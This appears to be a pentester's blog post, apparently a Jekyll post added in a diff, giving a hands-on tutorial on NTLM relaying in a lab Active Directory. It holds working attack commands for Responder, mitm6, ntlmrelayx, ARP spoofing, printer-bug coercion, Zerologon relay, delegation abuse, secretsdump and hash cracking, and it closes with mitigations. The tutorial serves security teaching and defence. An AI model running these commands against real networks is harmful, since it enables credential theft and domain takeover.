@@ -1,0 +1,463 @@
+I"U�<p>Hello fellas, or as we say in Germany: “Hallo Freunde der fettfreien Leberwurst.”</p>
+
+<p>In today’s blog-post we´ll be talking about relaying attacks, or more precisely about NTLM relaying attacks. So let´s get started.</p>
+
+<p>As you already know I am new to the pentest field and as such we´re not going to deep dive here, but instead I am trying to give you an overview of what, why and when, mixed with some practical examples in regards to relaying attacks. Wherever applicable I´ll provide you with links for further reading.</p>
+
+<p>There´s nothing new here, just a short overview of the different types of attacks. All the hard work has been done beforehand by awesome people like <a href="https://twitter.com/_dirkjan">Dirk-jan Mollema</a>, <a href="https://twitter.com/PythonResponder">Laurent Gaffie</a>, <a href="https://twitter.com/byt3bl33d3r">byt3bl33der</a> and all the crazy people behind <a href="https://github.com/SecureAuthCorp/impacket">impacket</a>, <a href="https://github.com/lgandx/Responder">responder</a>, <a href="https://github.com/fox-it/mitm6">mitm6</a> and <a href="https://github.com/bettercap/bettercap">bettercap</a>.</p>
+
+<p><img src="/images/2021-02-02/relay.png" /><br />
+<!--more--></p>
+<h2 id="introduction">Introduction</h2>
+
+<p>On a recent on-site engagement I was finding myself in a much foreclosed environment, consisting of two separate subnets with only very few clients, but a complete Windows Active Directory on each of them. As I let the vulnscanner off the leash, I tried to figure out additional attacking paths besides ports and services. Having a look around what was possible, I was lucky enough to find that NetBIOS / LLMNR and IPv6 where enabled.
+Those were two separate findings that might open the game to ntlmrelay, responder and mitm6. Together with the customer I was able to draw several attack paths, that an intruder with access to the network would be able to abuse, in order to do some severe damage to their environment.</p>
+
+<p>That being said…</p>
+
+<p><img src="/images/2021-02-02/timeforactionmeme.png" /></p>
+
+<h2 id="basics">Basics</h2>
+
+<p>So let´s start by going through some very basics.</p>
+
+<ol>
+  <li>
+    <p>What is <a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm">NTLM</a>?<br />
+<strong>NTL</strong>an<strong>M</strong>anager is an authentication protocol, and it is the successor of the <strong>L</strong>an<strong>Manager</strong> protocol. It is most likely to be found in Windows environments and was superseded by Kerberos since Windows 2000. However if Kerberos authentication is not supported, not available or turned off or compatibility reasons, Windows systems will fall back to NTLM.<br />
+The protocol has several design flaws and vulnerabilities, which you can read about <a href="https://en.wikipedia.org/wiki/NT_LAN_Manager#Weakness_and_Vulnerabilities">here</a> and <a href="https://www.helpnetsecurity.com/2019/10/10/ntlm-vulnerabilities/">here</a>, allowing for authentication relaying if specific options are missing or not set correctly.</p>
+  </li>
+  <li>
+    <p>What is relaying?<br />
+Simply spoken it´s playing <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">Man in the Middle</a>, intercepting an authentication request from let´s say a client who wants’ to access a SMB share on server A, and redirecting it to server B, so we as attacker can access the files on server B on their behalf.</p>
+  </li>
+  <li>
+    <p>How to become the MitM?<br />
+There are several ways. One of them is by ARP poisoning the subnet you are in, making other systems think you are the target they want to reach. Another one is by putting yourself in as the IPv6 DNS server of the systems, and as such fetch all DNS requests from the clients redirecting them where you want to. The next one is by replying to <a href="https://en.wikipedia.org/wiki/NetBIOS">NetBIOS-NS</a> or <a href="https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution">LLMNR</a> broadcasts, which might happen if e.g. someone mistypes an UNC-path in his explorer, DNS can´t resolve it and as such a NetBIOS-NS or LLMNR broadcast is sent (if enabled) in the subnet asking who has <code class="language-plaintext highlighter-rouge">\\fuckimisstypedmypath</code>. <a href="https://github.com/lgandx/Responder-Windows">responder</a> can listen for those requests and say “<em>Hey buddy, I am <code class="language-plaintext highlighter-rouge">\\fuckimisstypedmypath</code>, you can now proceed with authentication. Kerberos? Sorry mate. But you can use NTLM :)</em>”</p>
+  </li>
+</ol>
+
+<h2 id="attacks">Attacks</h2>
+
+<p>There are several possible attack paths, and I will go through some of them here. They can be mixed to some extent, so you can e.g. use mitm6 to have systems report to your attacker machine or bettercap. You can relay authentications over HTTP to LDAP or SMB. Other things are not working like SMB to LDAP if NetNTLMv2 is in play (see <a href="https://github.com/SecureAuthCorp/impacket/pull/500">here</a>).</p>
+
+<p>There are also several features which can be used like creating new computer objects in AD when relaying to LDAP, dumping SAM or executing command when connecting to SMB, open a permanent connection with the socks option and so on and so forth. I will mix all the stuff and make use of these features across the described scenarios - but feel free to use them according to your needs and adapt to the situation you are facing.</p>
+
+<h3 id="simple-fetch-of-hashes">Simple fetch of hashes</h3>
+
+<p>We´ll use responder in this case.<br />
+First we need to edit the config of responder, which can be found under <code class="language-plaintext highlighter-rouge">/usr/share/responder/Responder.conf</code>.<br />
+We want to enable SMB and HTTP server, so we can answer related requests. Our config should look like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>; Servers to start
+SQL = On
+SMB = On 
+RDP = On
+Kerberos = On
+FTP = On
+POP = On
+SMTP = On
+IMAP = On
+HTTP = On 
+HTTPS = On
+DNS = On
+LDAP = On
+</code></pre></div></div>
+
+<p>responder can be started like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>responder -I eth2
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">-I</code> is specifying our network interface to listen on</p>
+
+<p>Now when a user on the same subnet as the attacker is trying to access a SMB share which´s name doesn´t exist e.g. <code class="language-plaintext highlighter-rouge">\\deathstar</code>, the client will first ask the DNS-server if he knows where to find <code class="language-plaintext highlighter-rouge">deathstar</code>. The DNS server will reply that he cannot find a record for <code class="language-plaintext highlighter-rouge">deathstar</code> and as a fallback (as long as not disabled), the client will send a NetBIOS or LLMNR request (depending on the OS see <a href="https://www.crowe.com/cybersecurity-watch/netbios-llmnr-giving-away-credentials">here</a>, which is a broadcast in his subnet asking everyone: <em>Is someone here deathstar?</em></p>
+
+<p><img src="/images/2021-02-02/itsmememe.png" /></p>
+
+<p>That´s where responder comes into play, by answering these broadcasts, telling the client that he is <code class="language-plaintext highlighter-rouge">deathstar</code>.</p>
+
+<p><img src="/images/2021-02-02/deathstar.png" /></p>
+
+<p><img src="/images/2021-02-02/creds.png" /></p>
+
+<p>The hash that we get is an NetNTLMv2 hash, which we can crack e.g. with hashcat with the <code class="language-plaintext highlighter-rouge">-m 5600</code> hashmode. With the recovered clear text credentials we can then proceed to move laterally.</p>
+
+<p>The same can be done by answering browsers requests for a <a href="https://en.wikipedia.org/wiki/Web_Proxy_Auto-Discovery_Protocol">wpad</a> file. If the clients are set to autodiscover the settings for the proxy (which is the default setting) then the client will start to evaluate the address for the proxy config (sth. like http://wpad.company.com/wpad.dat, http://wpad.com/wwpad.dat - just have a look at the Wikipedia entry) in this order:</p>
+
+<ol>
+  <li>DHCP</li>
+  <li>DNS</li>
+  <li>On Windows if DNS fails - NetBIOS or LLMNR</li>
+</ol>
+
+<p>So if 1 and 2 are not configured, we can step in like described before, answering requests for the proxy config via NetBIOS / LLMNR.<br />
+A word of warning at this stage: Be aware that the client will afterwards route all his browser HTTP traffic to your attacker machine which might break stuff on the network.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>responder -I eth2 -w
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">-w</code> will enable the wpad proxy answering such requests</p>
+
+<p><img src="/images/2021-02-02/httpfettfreieleberwurst.png" /></p>
+
+<p>This again will give us the NetNTLMv2 hash.</p>
+
+<p>But we can do better. With the -b switch of responder, we can force the browser to do a basic authentication, which will give us the plain text creds.</p>
+
+<p><img src="/images/2021-02-02/httpfuckingtypo.png" /></p>
+
+<h3 id="dns-poisoning">DNS Poisoning</h3>
+
+<p>In modern Windows environments we have a lot of systems being capable of using IPv6 (all since Windows Vista). By default IPv6 is enabled, but no one is really using it in local networks. IPv6 is taking precedence over IPv4, so when we issue a system an IPv6 address let´s say via DHCP, it will first try to communicate over IPv6. Same is true for the DNS servers. If a system has an IPv4 and IPv6 entry for a DNS server, it will first contact the IPv6 one. The requests will be made whenever a machines restarts, a network cable is plugged in etc., so you may have a little patience during a real world engagement.</p>
+
+<p>This is where <a href="https://github.com/fox-it/mitm6">mitm6</a> comes into play. It´s a tool designed to answer IPv6 DHCP broadcasts in its subnet, assigning the demanding clients an IPv6 address in the link-local range and a DNS server. <em>Guess what: the DNS server is us.</em> If you want to know more head over to the official <a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/">blog about mitm6</a>.</p>
+
+<p>We start mitm6 with the following parameters:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mitm6 -d mcafeelab.local -i eth2 -hw Win10x64
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">-d</code> is the domain name that we filter our request on - the attacked domain<br />
+<code class="language-plaintext highlighter-rouge">-i</code> is the interface we have mitm6 listen on for events<br />
+<code class="language-plaintext highlighter-rouge">-hw</code> is for host whitelist and will enable you to limit the attack to a specific target, minimizing the effect on the attacked network</p>
+
+<p>Bear in mind that assigning IPv6 addresses to DCs and Exchange servers might disrupt their functions. When you have them on your subnet as well, you might also want to give the blacklist options of mitm6 a go, as they enable you to exclude domains or FQDNs. If you and the customer agreed on also attacking these machines, mitm6 was designed to only supply very short lease times and TTLs, so that very close to when you stop the attack everything will come back to normal functioning.</p>
+
+<p><img src="/images/2021-02-02/mimt6start.png" /></p>
+
+<p>Next fire up ntlmrelay:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 ntlmrelayx.py -ip 10.55.0.30 -wh evilwpad -t ldaps://10.55.0.1
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">-ip</code> is the interface you want the relay to run on<br />
+<code class="language-plaintext highlighter-rouge">-wh</code> is for WPAD host, specifying your wpad file to serve<br />
+<code class="language-plaintext highlighter-rouge">-t</code> is the target where you want to relay to. In this case I choose to simply query ldap for all the juicy info -&gt; will produce a lot of files for computer, users, policies, groups and trust</p>
+
+<p><img src="/images/2021-02-02/mitm6ntlmrelayldap.png" /></p>
+
+<p><img src="/images/2021-02-02/loot.png" /></p>
+
+<p>There are several other scenarios for the ntlmrelay where you can e.g. directly add a new computer object(<code class="language-plaintext highlighter-rouge">--add-computer</code>) via ldaps to the AD either using this to run bloodhound queries against the AD or by directly granting it delegation rights (<code class="language-plaintext highlighter-rouge">--delegate-access</code>) and do a resource based delegation attack: <a href="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/">Dirk´s blog</a>.</p>
+
+<h4 id="adding-a-resource">Adding a resource</h4>
+
+<p>Adding just a resource to later have valid credentials for the AD</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 ntlmrelayx.py -ip 10.55.0.30 -wh evilwpad -t ldaps://10.55.0.1 --add-computer
+</code></pre></div></div>
+
+<p><img src="/images/2021-02-02/addingcomputertoad.png" /></p>
+
+<h4 id="resource-based-delegation-attack">Resource based delegation attack</h4>
+
+<p><strong>HINT:</strong> In order to get the <code class="language-plaintext highlighter-rouge">--delegate-access</code> working correctly I had to do the following modifications to the <code class="language-plaintext highlighter-rouge">targetsutils.py</code> located under <code class="language-plaintext highlighter-rouge">impacket/impacket/examples/ntlmrelayx/utils</code>:</p>
+
+<p>Comment out line 136 and change 141 from .pop() to [0] - also see <a href="https://github.com/SecureAuthCorp/impacket/issues/914">issue914</a>:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">136</span>            <span class="c1">#            self.generalCandidates.remove(target)
+</span><span class="mi">137</span>                        <span class="k">return</span> <span class="n">target</span>
+<span class="mi">138</span>                <span class="n">LOG</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="s">"No more targets for user %s"</span> <span class="o">%</span> <span class="n">identity</span><span class="p">)</span>
+<span class="mi">139</span>               <span class="k">return</span> <span class="bp">None</span>
+<span class="mi">140</span>            <span class="k">else</span><span class="p">:</span>
+<span class="mi">141</span>                <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">generalCandidates</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+
+</code></pre></div></div>
+<p>Now we can run our attack:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 ntlmrelayx.py -wh evilwpad -t ldaps://dc2016-2.mcafeelab.local --delegate-access
+</code></pre></div></div>
+
+<p><img src="/images/2021-02-02/ressourcedelegation.png" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getST.py -spn cifs/WIN10X64.mcafeelab.local mcafeelab.local/GCTCRVBY\$ -impersonate administrator  
+export KRB5CCNAME=administrator.ccache  
+secretsdump.py -k -no-pass win10x64.mcafeelab.local  
+</code></pre></div></div>
+
+<p><img src="/images/2021-02-02/ressourcedelegation2.png" /></p>
+
+<p>Feel free to play around with the different scenarios.</p>
+
+<h3 id="arp-spoofing">ARP Spoofing</h3>
+
+<p>Okay, here we go. I was at a total loss when I wrote this blog-post and started playing around with ARP spoofing. No matter what I was trying, even though the ARP cache of my target was correctly poisoned, it never touched my kali box when I tried to reach any target on my network.<br />
+So here´s a big shot out to the creator of <a href="https://github.com/lgandx/Responder-Windows">responder</a> himself <a href="https://twitter.com/PythonResponder">Laurent Gaffié</a> who took his time and showed me how to successful run the attack. To be precise he pointed me to one of his <a href="http://g-laurent.blogspot.com/2016/10/introducing-responder-multirelay-10.html?m=1">blog-posts</a>.</p>
+
+<p>The idea behind the attack is that you answer ARP requests or proactively announce yourself on the subnet pretending to be someone else.<br />
+The actual communication of systems on the same subnet is taking place over MAC addresses, not IPs, and these are stored in every systems ARP table together with a reference to an IP address:</p>
+
+<p><img src="/images/2021-02-02/cleanarp.png" /></p>
+
+<p>So whenever a systems wants to send something to an IP it looks up its ARP table and sends it over layer 2 (from MAC to MAC) of the OSI model.<br />
+To evaluate which IP belongs to which MAC address, the system will send a broadcast asking: “<em>Who the fuck has 10.55.0.100?</em>” and the system with this IP replies with: “<em>That´s me buddy. My MAC is 00-0c-29-0a-24-00. Add me to your ARP table.</em>”</p>
+
+<p>Now comes the trick. If we are able to answer quicker than the real system, we´ll be able to have the system put our MAC into the ARP table for 10.55.0.100. Same can be achieved by flooding the subnet with “<em>Hey guys, I am 10.55.0.100. My MAC is 00-0c-29-fb-cd-56.</em>” We can even take it a step further and pretend to be more or all the IPs on the current subnet. But as always take care not to disrupt network.<br />
+The attack is aiming to put yourself in the MitM position by poisoning your desired target and the router of the subnet, spoofing both ARP tables and acting in between.<br />
+However this is not what we want here, as we are just playing around on our subnet. So here goes:</p>
+
+<p>First we need to prepare our kali box.</p>
+
+<p>A rewrite rule to route all traffic for 10.55.0.100:445 to ourselves 10.55.0.30:445</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iptables -t nat -A PREROUTING -p tcp --dst 10.55.0.100 --dport 445 -j DNAT --to-destination 10.55.0.30:445
+
+</code></pre></div></div>
+
+<p>Next fire up your tool of choice for ARP spoofing - I´ll stick to <a href="https://github.com/bettercap/bettercap">bettercap</a> here.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set arp.spoof.targets 10.55.0.2
+set arp.spoof.internal true
+arp.ban on
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">target</code> is the system which´s ARP cache we want to poison. So that if tries to reach a resource it will be directed to us.<br />
+The <code class="language-plaintext highlighter-rouge">internal</code> switch will tell bettercap to do ARP poisoning on its own subnet, otherwise the attack won´t work.<br />
+<code class="language-plaintext highlighter-rouge">arp.ban on</code> will start the attack, putting IP forwarding for our box to false, so no packets are passing through.</p>
+
+<p>The ARP cache on our victim machine now looks like this:</p>
+
+<p><img src="/images/2021-02-02/dirtyarp.png" /></p>
+
+<p>Notice how our attacker MAC address is now omnipresent.</p>
+
+<p>With ntlmrelay running in the background we can wait till the admin on 10.55.0.2 tries to open files on 10.55.0.100.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntlmrelayx.py -tf targets.txt -smb2support -socks
+</code></pre></div></div>
+
+<p><img src="/images/2021-02-02/noaccess.png" /></p>
+
+<p>And fetch the loot:</p>
+
+<p><img src="/images/2021-02-02/arpattack.png" /></p>
+
+<p>I think we can do even better by just poisoning one specific entry in the victims ARP cache, and I guess Laurent did explain it in his blog-post with ettercap. This would be more like the scalpel approach rather than a MOAB, reducing disruptions to a minimum. But I am not going to test this here, as it would stress the length of this article.</p>
+
+<h3 id="ms-rprn-printer-bug">MS-RPRN Printer Bug</h3>
+
+<p>Yes, there he is, the infamous printer bug found and abused by <a href="https://twitter.com/tifkin_">Lee Christensen</a>. <br />
+It will allow you (if the spool service is running which is default) to have the computer-account authenticate to your attacker system. Normally this is to be seen in combination with unconstrained delegation attacks, but it will also serve the purpose of just relaying e.g. to SMB on another system. It is not uncommon, that computer-accounts are local admins to other systems, which would give you full access to these systems.<br />
+So let´s jump in.</p>
+
+<p>If you want to check if a system is vulnerable to this attack you can use the scanner from <a href="https://raw.githubusercontent.com/vletoux/SpoolerScanner/master/SpoolerScan.ps1">vletoux</a> or use the implemented function from <a href="https://github.com/S3cur3Th1sSh1t/WinPwn">S3cur3Th1sSh1t´s WinPwn</a>.</p>
+
+<p>The code for the SpoolSample can be found <a href="https://github.com/leechristensen/SpoolSample">here</a>.</p>
+
+<p>We fire up ntlmrelay again:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 ntlmrelayx.py -t smb://10.55.0.100 -smb2support -socks
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">-t</code> again is our target, in this case a workstation which we want to relay to as an SMB session<br />
+<code class="language-plaintext highlighter-rouge">-smb2support</code> well yes it enables smb2support <em>who would have thought it</em><br />
+<code class="language-plaintext highlighter-rouge">-socks</code> is a cool feature which will get you away from the one shot scenarios and keep the session(s) alive, so you can interact with it at any given time -&gt; more on this <a href="https://www.secureauth.com/blog/playing-with-relayed-credentials/">here</a>.</p>
+
+<p><img src="/images/2021-02-02/ntlmrelaysocks.png" /></p>
+
+<p>Next we need to be in domain context, so you either are on a domain joined system or you have creds and do a runas /netonly from powershell.</p>
+
+<p><img src="/images/2021-02-02/spoolsample.png" /></p>
+
+<p><img src="/images/2021-02-02/houstonmeme.png" /></p>
+
+<p>You can list all active connections with the <code class="language-plaintext highlighter-rouge">socks</code> cmdlet.</p>
+
+<p><img src="/images/2021-02-02/socksconnect.png" /></p>
+
+<p>And as you can already see, the computer-account of the DC is also admin on the client Win10X64 / 10.55.0.100.</p>
+
+<p>So what next?</p>
+
+<p><img src="/images/2021-02-02/proxychainsmeme.png" /></p>
+
+<p>Have <code class="language-plaintext highlighter-rouge">/etc/proxychains4.conf</code>use a socks4 on your attacker machine:</p>
+
+<p><img src="/images/2021-02-02/proxychainsconf.png" /></p>
+
+<p>And route your tool of choice through the proxy. The password can be empty as the socks part of ntlmrelay will take care of the authentication, as long as you exactly use the notation from the <code class="language-plaintext highlighter-rouge">socks</code> output!!!</p>
+
+<p>The socks game can be improved further as can be read <a href="https://www.secureauth.com/blog/what-is-old-is-new-again-the-relay-attack/">here</a>. The tool makes it possible to specify multiple targets to which it will relay an incoming authentication by making use of the SMB status <code class="language-plaintext highlighter-rouge">STATUS_NETWORK_SESSION_EXPIRED</code>, which will force the client to reauthenticate and as such allowing us to relay to as many devices as we like. The targets can either be plain IPs or DNS-names, or we can directly specify the protocol like LDAPS://10.55.0.1 or SMB://10.55.0.50. It is even possible to specify the user, so that we don´t relay all incoming connections like so: LDAP://MCAFEELAB\Administrator@10.55.0.2.</p>
+
+<p>Define targets:</p>
+
+<p><img src="/images/2021-02-02/targets.png" /></p>
+
+<p>Start ntlmrelay:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntlmrelayx.py -tf targets.txt -smb2support -socks
+</code></pre></div></div>
+
+<p>See them connections rolling in:</p>
+
+<p><img src="/images/2021-02-02/socksmany.png" /></p>
+
+<p>You can now proceed as described above.</p>
+
+<h4 id="smbclient">smbclient</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains smbclient.py MCAFEELAB/DC2016-2\$@10.55.0.100
+</code></pre></div></div>
+
+<p>Jepp you are right, special characters like <code class="language-plaintext highlighter-rouge">$</code> need to be properly escaped with a <code class="language-plaintext highlighter-rouge">\</code>.</p>
+
+<p><img src="/images/2021-02-02/smbclient.png" /></p>
+
+<h4 id="secretsdumppy">secretsdump.py</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains secretsdump.py MCAFEELAB/DC2016-2\$@10.55.0.100
+</code></pre></div></div>
+
+<p><img src="/images/2021-02-02/secretsdumppy.png" /></p>
+
+<p>You get the point here…</p>
+
+<h3 id="zero-logon">Zero Logon</h3>
+
+<p>Yeah that is still a problem, although the more recent systems are about to get a forced update to fix this this month. My personal opinion is that we will see this for longer on internal pentests.</p>
+
+<p>However Dirk-jan did an outstanding job when he came up with an attack vector for this vulnerability which didn´t rely on resetting or zeroing the DC´s computer account password -&gt; read <a href="https://dirkjanm.io/a-different-way-of-abusing-zerologon/">here</a>.</p>
+
+<p>We can again use ntlmrelay to carry out the attack. All we need to have is:</p>
+<ol>
+  <li>2 DCs</li>
+  <li>One DC vulnerable to Zerologon the other one to the printer bug</li>
+</ol>
+
+<p>Check if DCs are vulnerable with <a href="https://github.com/BC-SECURITY/Invoke-ZeroLogon">this</a>:</p>
+
+<p><img src="/images/2021-02-02/checkzerologon.png" /></p>
+
+<p>Now we can fire up ntlmrelay with the <code class="language-plaintext highlighter-rouge">DCSYNC</code> option:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntlmrelayx.py -t DCSYNC://10.55.0.1 -smb2support
+</code></pre></div></div>
+
+<p>And trigger the printer bug on the other DC:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\SpoolSample_v4.5_x64..exe dc2016-2.mcafeelab.local 10.55.0.30
+</code></pre></div></div>
+
+<p><img src="/images/2021-02-02/jokermeme.png" width="500" /></p>
+
+<p>Dom-Admin hash which we can use together with mimikatz to do a dcsync or all the other dirty things.</p>
+
+<p><img src="/images/2021-02-02/zeropwn.png" /></p>
+
+<h3 id="dhcp-poisoning-attack">DHCP Poisoning Attack</h3>
+
+<p>Laurent introduced the ability to carry out DHCP poisoning attacks with his releas of Responder in August 2021. You can read the full details in his <a href="https://g-laurent.blogspot.com/2021/08/responders-dhcp-poisoner.html">blog</a>.<br />
+You can also find a short “get me started” guide on <a href="https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/dhcp-poisoning">The Hacker Recipes</a>. <br />
+To make it short for you chocolate bunnies, here’s a quick wrap up:<br />
+The technique also injects a rogue WPAD, but this time via a DHCP offer. So us evil geniuses sitting on a subnet with, let’s say a bunch of Office clients, only need to win the race condition with the legit DHCP server, and answer the DHCP broadcasts faster. As in a real world scenario the server (hopefully) sits on another subnet, we are most likely to win the race.<br />
+The cool part about this technique is, that it is nondisruptive. Responder answers with a DHCP ACK package with a nonsense IP config, but a valid WPAD config and an only 10 second lasting leastime. The client shortly after issues another DHCP REQUEST, and this time Responder just let’s it pass (all attacked clients are tracked via their MAC and attacked at a max of 4 times) and let the legit server do its job. However the WPAD settings we injected can’t be overwritten by the legit DHCP ACK until the next reboot ^^.<br />
+So be there early in the morning when everyone turns on their devices, or just wait for the normal leases to run out during the day and enjoy your MitM.</p>
+
+<p>Howto:<br />
+<img src="/images/2021-02-02/DHCP1.png" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Responder.py -I eth2 -Pdv
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">-I</code> The interface that sits inside the network we want to attack<br />
+<code class="language-plaintext highlighter-rouge">-P</code> Enforce Proxy authentication, rather than NTLM auth for the wpad retrieval<br />
+<code class="language-plaintext highlighter-rouge">-d</code> Enable answers for DHCP broadcast requests. This option will inject a WPAD server in the DHCP response.
+<code class="language-plaintext highlighter-rouge">-v</code> Please be verbose</p>
+
+<p>The cool thing is, that the attacked systems just need to be started and you’ll already catch the system hashes, as soon as they want to request something through a proxy - like updates and stuff. When the user logs in, you’ll also get their hashes fyling in. Hello MS update :)</p>
+
+<p><img src="/images/2021-02-02/DHCP2.png" /></p>
+
+<p>This can again be combined with something like a NTLM downgrade attack with the <code class="language-plaintext highlighter-rouge">--lm</code> switch or a custom Challenge set in the <code class="language-plaintext highlighter-rouge">Responder.conf</code>.</p>
+
+<p>Another cool thing to do is relaying. For this to work just use the <code class="language-plaintext highlighter-rouge">-d</code> option with responder, and let e.g. ntlmrealyx.py do the relay stuff. In this case however ntlmrelayx need to be setup to use the proxy port 3128, which is the default port for proxying and is set by the WPAD responder config:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./Responder.py -I eth2 -dv
+</code></pre></div></div>
+<p>System reboot -&gt; we see incoming proxy requests:<br />
+<img src="/images/2021-02-02/DHCP3.png" /></p>
+
+<p>And with ntlmrelayx running, we carry out a RBCD attack against the system:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 ntlmrelayx.py -t ldaps://10.55.0.2 --http-port 3128 --delegate-access
+</code></pre></div></div>
+<p>SUCCESS:<br />
+<img src="/images/2021-02-02/DHCP4.png" /></p>
+
+<h3 id="ntlm-downgrade-attack">NTLM Downgrade Attack</h3>
+<p><a href="#ntlm-downgrade-attack"></a>
+When the settings in the AD allow it, e.g. NTLMv2 (LAN Manager authentication level is &lt;= 2) is not enforced, we can downgrade to NTLMv1 and get our hands on hashes that can easily be bruteforced to plain NT hashes. The workflow is as follows:</p>
+
+<ul>
+  <li>Edit Responder.conf to use a custom challenge of 1122334455667788</li>
+</ul>
+
+<p><img src="/images/2021-02-02/customchallenge.png" /></p>
+
+<ul>
+  <li>Just run Responder with your desired options and the <code class="language-plaintext highlighter-rouge">--lm</code> switch (I found that the DHCP proxy auth attack did not work as it always gave me ESS responses, even if I disabled it with the –disable-ess switch. So I’ll stick with a “normal” poisoning attack here)</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./Responder.py -I eth2 --lm
+</code></pre></div></div>
+<p><img src="/images/2021-02-02/ntlmdowngrade.png" /></p>
+
+<p>When both hash values equal, we are fine and can proceed.</p>
+
+<ul>
+  <li>Head over to <a href="https://crack.sh/get-cracking/">crack.sh</a> and submit a cracking job for NTLM like <code class="language-plaintext highlighter-rouge">NTHASH:&lt;yourhashhere&gt;</code></li>
+</ul>
+
+<p><img src="/images/2021-02-02/cracksh.png" /></p>
+
+<p>It mostly just takes seconds, and you’ll find yourself with a friendly email in your inbox.</p>
+
+<p><img src="/images/2021-02-02/cracked.png" /></p>
+
+<ul>
+  <li>And lastely -&gt; profit</li>
+</ul>
+
+<p><img src="/images/2021-02-02/pwnd.png" /></p>
+
+<h2 id="mitigations">Mitigations</h2>
+
+<p><img src="/images/2021-02-02/mitigatememe.png" /></p>
+
+<p>These attacks have lots of aspects.<br />
+Disable NetBIOS on all clients that don´t need it.  <br />
+Disable LLMNR on all clients that don´t need it.<br />
+Enable SMB signing for your whole environment if possible.<br />
+Enforce LDAP signing and channel binding.<br />
+Disable the printer spool service where it´s not needed - <em>No, your DCs don´t fucking need it!</em><br />
+Disable IPv6 on all devices that don´t need it or at least block DHCPv6 and router advertisement traffic with you client-firewall (Windows firewall will work with GPOs). Thanks to a mention from <a href="https://twitter.com/Davewarrington">David Warrington</a> Microsoft says it is best practice not to disable IPv6 but give IPv4 precedence over IPv6 as described <a href="https://docs.microsoft.com/en-US/troubleshoot/windows-server/networking/configure-ipv6-in-windows">here</a>.<br />
+If not in use: Disable WPAD via GPO. If in use: manually specify the path to your WPAD config - no autoconfig please. To further harden against WPAD attacks you can disable the <code class="language-plaintext highlighter-rouge">WinHttpAutoProxySvc</code> service -&gt; see <a href="https://googleprojectzero.blogspot.com/2017/12/apacolypse-now-exploiting-windows-10-in_18.html">here</a><br />
+Patch your systems regularly - <em>No, twice a year is bullshit!</em><br />
+Separate your systems. Best way is to work with TIERing models. Clients don´t belong in the same subnet as your DCs. <br />
+Wisely use highly privileged accounts.</p>
+
+<p>Enable smb signing: <a href="https://www.rootusers.com/configure-smb-signing-via-group-policy/">https://www.rootusers.com/configure-smb-signing-via-group-policy/</a> <br />
+Disable llmnr: <a href="https://www.blackhillsinfosec.com/how-to-disable-llmnr-why-you-want-to/">https://www.blackhillsinfosec.com/how-to-disable-llmnr-why-you-want-to/</a>  <br />
+Disable NetBIOS: <a href="http://woshub.com/how-to-disable-netbios-over-tcpip-and-llmnr-using-gpo/">http://woshub.com/how-to-disable-netbios-over-tcpip-and-llmnr-using-gpo/</a> <br />
+LDAP channel binding: <a href="https://support.microsoft.com/en-us/topic/use-the-ldapenforcechannelbinding-registry-entry-to-make-ldap-authentication-over-ssl-tls-more-secure-e9ecfa27-5e57-8519-6ba3-d2c06b21812e">https://support.microsoft.com/en-us/topic/use-the-ldapenforcechannelbinding-registry-entry-to-make-ldap-authentication-over-ssl-tls-more-secure-e9ecfa27-5e57-8519-6ba3-d2c06b21812e</a></p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>Wow, what a complex topic. Yet we’ve only scratched the surface as you can see from the many linked resources.</p>
+
